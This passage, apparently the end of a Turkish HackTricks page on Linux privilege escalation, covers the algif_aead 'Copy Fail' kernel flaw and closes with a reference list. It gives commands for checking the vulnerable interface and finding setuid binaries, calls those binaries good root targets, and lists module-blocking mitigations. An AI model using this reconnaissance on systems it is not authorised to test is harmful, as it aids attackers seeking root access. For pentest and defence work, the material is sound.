grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Aşağıdaki yapılandırma değerleri, yüklenebilir bir arayüzü çekirdeğe yerleşik olan arayüzden ayırır; crypto derleme kuralları `CONFIG_CRYPTO_USER_API_AEAD` değerini `algif_aead` ile eşler.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir modül olarak yüklenebilir/boşaltılabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: arayüz çekirdeğe yerleşik olarak derlenir
- setuid binary'ler iyi hedeflerdir; çünkü yalnızca page cache'i etkileyen bir yama, yerel bir foothold'u root erişimine yükseltmek için yeterli olabilir

#### `algif_aead` yolu için saldırı yüzeyini azaltma

Güvenlik açığı bulunan arayüz yüklenebilir bir modül tarafından sağlanıyorsa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Çekirdeğe derlenmişse, bazı açıklamalarda init yolunun şu şekilde engellendiği bildirildi:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Bu tür bir azaltım, diğer kernel LPE'leri için de akılda tutulmaya değer: Sömürü belirli bir isteğe bağlı arayüze bağlıysa, bu arayüzü devre dışı bırakmak veya kara listeye almak, tam bir kernel yükseltmesi mümkün olmadan önce bile exploit yolunu kesebilir.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – kullanıcı tarafından yazılabilir bir PaperCut dizinindeki root tarafından çalıştırılan bir scripti ele geçirme](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) SSS](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 için Openwall oss-security açıklaması](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable düzeltmesi: crypto: algif_aead - out-of-place çalışma biçimine geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 güvenlik duyurusu](https://copy.fail/)
- [7] [Theori / Xint teknik incelemesi](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone deposu / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE varyantı DirtyClone'u (CVE-2026-43503) inceleme ve exploit etme](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux düzeltmesi: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` bayrağını koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux önceki azaltımı: splice edilmiş UDP paketleri için `SKBFL_SHARED_FRAG` ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian kılavuz sayfası](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel belgeleri](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME uygulama ilişkilendirmeleri](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info belirtimi](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry belirtimi](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig dili](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile dosyası](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache güvenlik açığı](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` belgeleri](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` belgeleri](https://git-scm.com/docs/git-ls-tree)
- [33] [Git yapılandırma belgeleri](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator belgeleri](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: kalıcılık mekanizmaları](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
